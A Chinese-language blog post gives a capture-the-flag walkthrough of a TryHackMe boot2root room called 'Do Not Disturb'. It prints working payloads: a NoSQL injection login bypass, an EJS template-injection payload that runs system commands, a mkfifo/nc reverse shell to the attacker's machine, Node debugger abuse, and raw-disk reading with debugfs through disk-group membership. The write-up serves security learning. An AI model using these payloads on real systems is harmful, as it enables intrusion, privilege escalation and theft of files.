[ **Dreeam的边缘临界** ](https://blog.dreeam.me/)
  * [ 首页 ](https://blog.dreeam.me/)
  * [ 归档 ](https://blog.dreeam.me/archives/)
  * [ 分类 ](https://blog.dreeam.me/categories/)
  * [ 标签 ](https://blog.dreeam.me/tags/)
  * [ 关于 ](https://blog.dreeam.me/about/)
  * [ 友链 ](https://blog.dreeam.me/links/)
  * [ ](javascript:;)
  * [ ](javascript:;)


[ 首页 ](https://blog.dreeam.me/)
[ 归档 ](https://blog.dreeam.me/archives/)
[ 分类 ](https://blog.dreeam.me/categories/)
[ 标签 ](https://blog.dreeam.me/tags/)
[ 关于 ](https://blog.dreeam.me/about/)
[ 友链 ](https://blog.dreeam.me/links/)
[ 搜索 ](javascript:;)
[ 关灯 ](javascript:;)
_
2026年8月8日 早上 
4.6k 字  39 分钟 
# Write-up: HH2026 - Do Not Disturb
本文最后更新于 2026年8月7日 晚上 
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x0-%E5%89%8D%E8%A8%80 "0x0 前言")0x0 前言
  * **名字** ：[Hacker Holidays 2026 - Day 7 - Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)
  * **平台** ：TryHackMe
  * **难度** ：中等
  * **分类** ：Boot2Root
  * **包含元素** ：
    * NoSQL 注入
    * SSTI
    * Node 调试器滥用
    * Linux disk 组提权


###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E9%A2%98%E7%9B%AE "题目")题目
门上挂着“请勿打扰”的牌子，房间内有活跃会话。你拥有本不该给你的访问权限，而他也一样。
异常现象已不再是异常：一张日光浴床上的会话突然变为活跃，一个陌生人坐了上去；一个钱包签署了一笔其主人并未授权的交易；海滩上的一个贝壳居然做出了回应。于是，情况变得清晰——那个已经潜入其中的人，比你早行动了太久。
Byte Lotus 的池畔平台记录着每一间小屋、每一张日光浴床、每一次活跃会话。Byte Lotus 从不遗忘。有人已经进去了。跟随他的足迹，沿着他攀爬的路径，找回两面旗帜。
点击查看题目原文
Sign’s on the door. Room’s active. You have access you were never given, and so does he.
The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn’t authorise, a shell on the beach answers back. And it becomes clear that whoever’s already inside has been moving for far longer than you have.
The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.
这是一个难度标为 中等 的房间，难度终于上来了。
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86 "0x1 信息搜集")0x1 信息搜集
###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%89%8D%E7%AB%AF%E5%88%86%E6%9E%90 "前端分析")前端分析
前端只呈现一个 Byte Lotus 酒店的登录表单，用户名输入框的提示为 `attendant`。
右键查看页面源码，未发现注释和其他明显突破口。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-1.png)
###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90 "题目分析")题目分析
> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets.
说明题目可能涉及 Session 相关。Session 生命周期的管理不当，导致允许 Session 被复用或其他问题。
> Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.
可能指的是站点已经被 compromised，可以使用这个 attendant 账号获得权限？暂作留存（
###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#HTTP-%E6%A0%87%E5%A4%B4%E6%A3%80%E6%9F%A5 "HTTP 标头检查")HTTP 标头检查  
| 
```
1  

```
 | 
```
curl -v IP  

__BASH
```
 |  
| --- | --- |  
存在字段：
  * `X-Powered-By: Express`


可以推测站点使用了 Express.js 作为框架。
###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%AD%90%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE "子目录枚举")子目录枚举
feroxbuster 扫描：  
| 
```
1  

```
 | 
```
feroxbuster -u 'IP' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 70 --scan-dir-listings  

__BASH
```
 |  
| --- | --- |  
发现存在 `/staff`，返回 403，仅限有权限的访问，暂作留存。
###  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%9E%9A%E4%B8%BE "开放端口枚举")开放端口枚举
nmap 扫描  
| 
```
1  

```
 | 
```
sudo nmap -sS -p- -T4 IP  

__BASH
```
 |  
| --- | --- |  
开放端口：
  * 22
  * 80


##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x2-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%EF%BC%9ANoSQL-%E6%B3%A8%E5%85%A5 "0x2 初始访问：NoSQL 注入")0x2 初始访问：NoSQL 注入
目标站点使用 Express.js，可以猜测技术栈大概率为 MERN，数据库可能使用 MongoDB，尝试用 NoSQL 注入验证。
使用 Firefox 的 dev tools，可以很轻松的观察请求内容，修改并重放请求。
`Inspect -> Network -> 右键请求 -> Edit and Resend`
随便填用户名和密码，点击 Sign In，可以观察到 `/login` POST 请求 Body 的结构为：  
| 
```
1  

```
 | 
```
username={USER}&password={PASS}  

__BASH
```
 |  
| --- | --- |  
尝试通用的 NoSQL 盲注-身份验证绕过的 payload：  
| 
```
1  

```
 | 
```
username[$ne]=null&password[$ne]=null  

__BASH
```
 |  
| --- | --- |  
重放请求后，返回了一个 302 跳转，目标为 `/staff`，并下发了 cookie。  
将 cookie 填入浏览器并访问 `/staff` 后，仍然是 `403 Staff access only`。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-2.png)
这可能说明注入存在，但是匹配到的第一个用户并不具有 staff 权限。尝试使用 `attendant` 作为用户名进行注入。  
| 
```
1  

```
 | 
```
username=attendant&password[$ne]=null  

__BASH
```
 |  
| --- | --- |  
重复上述步骤后，就可以获得 `/staff` 的访问了。
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x3-SSTI "0x3 SSTI")0x3 SSTI
访问 `/staff` 并观察页面。
从 `Confirmation template`，EJS，和输入框中的 `<%= guest %>` 在 Preview 中被解析成用户名 `attendant`，可得知这可能存在 SSTI 模版注入。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-3.png)
使用非常经典的 `7 * 7` payload，点击 Preview 后也是成功地被解析成 49， 说明确实存在 SSTI。
随后可以使用如下 payload 执行系统命令：  
| 
```
1  

```
 | 
```
<%= (function(){ return process.getBuiltinModule('child_process').execSync('COMMAND').toString(); })() %>  

__JS
```
 |  
| --- | --- |  
因为 `require('child_process')` 在目标上无法使用，在这里我用了 `process.getBuiltinModule('child_process')` 来获取 Node 应用的 child process 模块。这样就可以用 child process 模块的 `execSync('COMMAND').toString()` 来执行系统命令，并返回命令的结果了。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-4.png)
接下来就是收集信息，可以用如下系统命令：
  * `id` 查当前用户：`poolside`
  * `ls /home` 查存在用户：`poolside`, `pipelinesvc`
  * `pwd` 查所在路径：/opt/poolside


使用 `ls /home/poolside` 定位到 `user.txt`。  
并用 `cat /home/poolside/user.txt` 拿到第一个 flag。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-5.png)
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x4-%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5 "0x4 内网侦查")0x4 内网侦查
拿到了对内网的初始访问和第一个 flag 之后，就可以进行内网侦查，寻找路径进行提权了。
**（为了便于阅读，下文所列命令均已去掉 SSTI 模板包裹，请在实际利用时自行包裹。）**
查看所有正在运行的服务：  
| 
```
1  

```
 | 
```
systemctl list-units --type=service --state=running  

__BASH
```
 |  
| --- | --- |  
检查服务列表，可以看到有两个正在运行的服务和本房间有关：
  * `lotus-telemetry.service` - 运行着 Byte Lotus 酒店的遥测服务
  * `poolside.service` - 运行着 Byte Lotus 酒店池畔平台的前端（当前网站）


![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-6.png)
查看遥测服务的状态：  
| 
```
1  

```
 | 
```
systemctl status lotus-telemetry.service  

__BASH
```
 |  
| --- | --- |  
可以看到这也是一个 Node 应用，入口文件位于 `processor.js` 这个 JS 文件，并且使用了 `--inspect=127.0.0.1:9229` 这个 flag。  
查询 Node.JS 文档可知，`--inspect` 是用来启用 Node 应用的调试功能的。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-7.png)
查看 `lotus-telemetry.service` 服务的配置文件：  
| 
```
1  

```
 | 
```
systemctl cat lotus-telemetry.service  

__BASH
```
 |  
| --- | --- |  
获得了更多的有用信息
  * 指定工作目录为 `/opt/pipelinesvc/telemetry`
  * `User` 和 `Group` 都为 `pipelinesvc`


这说明服务是以 `pipelinesvc` 用户身份运行的，并且 `processor.js` 位于工作目录内。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-8.png)
工作目录：  
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-9.png)
`processor.js` 源码：  
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-10.png)
工作目录内没找到有用的线索。`processor.js` 看上去也只是一个检测并记录系统平均负载的日志记录器，不存在输入。
回到这个服务运行所使用的用户 `pipelinesvc`，说不定这个用户有什么特殊权限，可以进行利用呢。
使用 `id` 查看用户所在组：  
| 
```
1  

```
 | 
```
id pipelinesvc  

__BASH
```
 |  
| --- | --- |  
发现这个用户除了拥有自己的私有用户组，还加入了 Linux 的 disk 组。  
| 
```
1  

```
 | 
```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)  

__BASH
```
 |  
| --- | --- |  
这是非常危险的，因为处在 disk 组的用户拥有了对系统的原始块设备的读写权限。  
这时候就可以利用 Node 的调试功能，和这个高权限相结合，来读取盘上的 `root.txt` flag。
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x5-%E6%8F%90%E6%9D%83 "0x5 提权")0x5 提权
要连上目标本地的 Node 应用的调试，首先我们需要一个 shell。
在本机开启监听器：  
| 
```
1  

```
 | 
```
nc -nlvp PORT  

__BASH
```
 |  
| --- | --- |  
使用 SSTI 配合如下命令，创建一个非常经典的 pipe reverse shell：  
| 
```
1  

```
 | 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP 9001 >/tmp/f  

__BASH
```
 |  
| --- | --- |  
可以看到连接成功建立。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-11.png)
使用如下命令进入目标 Node 应用的调试，并进入目标的 REPL（交互式解释器）。  
| 
```
1  
2  

```
 | 
```
node inspect 127.0.0.1:9229  
repl  

__BASH
```
 |  
| --- | --- |  
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-12.png)
随后通过 child process 直接执行系统命令：  
| 
```
1  

```
 | 
```
process.getBuiltinModule('child_process').execSync('COMMAND').toString()  

__JS
```
 |  
| --- | --- |  
**（为了便于阅读，下文所列命令均已去掉 child process 调用链包裹，请在实际利用时自行包裹。）**
使用 `id` 来二次确认 `processor.js` 启动的 Node 应用是以 `pipelinesvc` 的用户权限执行的。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-13.png)
使用以下命令寻找根目录所在的块设备：
  * `df -h`
  * `lsblk`
  * `mount | grep " / "`


用 `mount` 命令确认了 `/` 目录是挂载在 `/dev/nvme0n1p1` 设备上的。
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-14.png)
知道了设备名，就可以使用 `debugfs` 命令通过块设备来读取存在 `/root/root.txt` 的第二个 flag 了。  
通过阅读 [`debugfs`](https://man7.org/linux/man-pages/man8/debugfs.8.html) 的 man 手册，即可知道这个命令的用法。指定块设备，并用 `-R` 执行 `cat` 命令读取 `root.txt`。  
| 
```
1  

```
 | 
```
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1  

__BASH
```
 |  
| --- | --- |  
![](https://blog.dreeam.me/img/write-up/wp-do-not-disturb-15.png)
##  [](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x6-%E7%BB%93%E8%AF%AD "0x6 结语")0x6 结语
这是一个内容挺足的房间，也学到了很多东西（
需要注意的是，连接至目标 Node 应用的调试客户端后，需要进入 REPL，才是目标 Node 应用的交互式 shell。因为使用 `node inspect` 时，Node 会新创建一个进程作为调试 cli 的进程，所使用的用户上下文为当前的用户（`poolside`）。只有在进入目标 Node 应用的 REPL 后，用户上下文才会切换至目标应用所运行的用户（`pipelinesvc`）。
* * *
[网络安全](https://blog.dreeam.me/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/)
[#TryHackMe](https://blog.dreeam.me/tags/TryHackMe/) [#Hacker Holidays 2026](https://blog.dreeam.me/tags/Hacker-Holidays-2026/) [#Boot2Root](https://blog.dreeam.me/tags/Boot2Root/)
Write-up: HH2026 - Do Not Disturb
https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/
作者
Dreeam
发布于
2026年8月8日
许可协议
[ ](https://creativecommons.org/licenses/by-nc-sa/4.0/) [ ](https://creativecommons.org/licenses/by-nc-sa/4.0/) [ ](https://creativecommons.org/licenses/by-nc-sa/4.0/)
[ Write-up: Recruit 下一篇 ](https://blog.dreeam.me/2026/07/15/write-up-thm-recruit/ "Write-up: Recruit")
目录
  1. ›[0x0 前言](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x0-%E5%89%8D%E8%A8%80 "0x0 前言")
    1. ›[题目](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E9%A2%98%E7%9B%AE "题目")
  2. ›[0x1 信息搜集](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86 "0x1 信息搜集")
    1. ›[前端分析](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%89%8D%E7%AB%AF%E5%88%86%E6%9E%90 "前端分析")
    2. ›[题目分析](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90 "题目分析")
    3. ›[HTTP 标头检查](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#HTTP-%E6%A0%87%E5%A4%B4%E6%A3%80%E6%9F%A5 "HTTP 标头检查")
    4. ›[子目录枚举](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%AD%90%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE "子目录枚举")
    5. ›[开放端口枚举](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%9E%9A%E4%B8%BE "开放端口枚举")
  3. ›[0x2 初始访问：NoSQL 注入](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x2-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%EF%BC%9ANoSQL-%E6%B3%A8%E5%85%A5 "0x2 初始访问：NoSQL 注入")
  4. ›[0x3 SSTI](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x3-SSTI "0x3 SSTI")
  5. ›[0x4 内网侦查](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x4-%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5 "0x4 内网侦查")
  6. ›[0x5 提权](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x5-%E6%8F%90%E6%9D%83 "0x5 提权")
  7. ›[0x6 结语](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/#0x6-%E7%BB%93%E8%AF%AD "0x6 结语")


[ ](https://blog.dreeam.me/2026/08/08/write-up-hh2026-do-not-disturb/)
#### 搜索
×
关键词
[Hexo](https://hexo.io) [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)
© 2025-2026 Dreeam. 内容采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans) 许可共享. 
